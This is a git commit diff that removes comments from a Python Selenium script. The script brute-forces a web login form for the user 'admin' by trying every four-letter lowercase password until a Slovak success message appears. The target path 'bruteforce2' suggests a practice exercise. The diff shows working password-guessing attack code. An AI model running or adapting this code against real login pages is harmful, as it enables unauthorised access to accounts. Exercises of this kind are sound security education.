612d7f6b11d3b710b7d26965968e689df28449c1
Dynamo285K <113776601+Dynamo285K@users.noreply.github.com>
2024-01-07 21:28:44 +0100

    Update skuska.py

--- skuska.py
+++ skuska.py
@@ -8,7 +8,7 @@ driver = webdriver.Chrome()
 alphabet = string.ascii_lowercase
 print(alphabet)
 
-# Navigate to the login page outside the loop
+
 driver.get('https://dudo.gvpt.sk/bruteforce2/index.php')
 
 for i in alphabet:
@@ -18,9 +18,9 @@ for i in alphabet:
                 heslo = i + j + k + l
                 print(f"Trying password: {heslo}")
 
-                # Find the username and password fields and input your credentials
-                username_field = driver.find_element(By.NAME, "username")  # Use By.NAME locator strategy
-                password_field = driver.find_element(By.NAME, "password")  # Use By.NAME locator strategy
+                
+                username_field = driver.find_element(By.NAME, "username") 
+                password_field = driver.find_element(By.NAME, "password") 
 
                 username_field.clear()
                 password_field.clear()
@@ -28,12 +28,12 @@ for i in alphabet:
                 username_field.send_keys('admin')
                 password_field.send_keys(heslo)
 
-                # Submit the form (you can use other methods like click() on the login button)
+               
                 password_field.send_keys(Keys.RETURN)
 
                 if 'Úspešne si sa prihlásil' in driver.page_source:
                     print(f"Successfully logged in with password: {heslo}")
-                    driver.quit()  # Close the browser once successful login is found
+                    driver.quit()  
                     exit()
 
                 else:
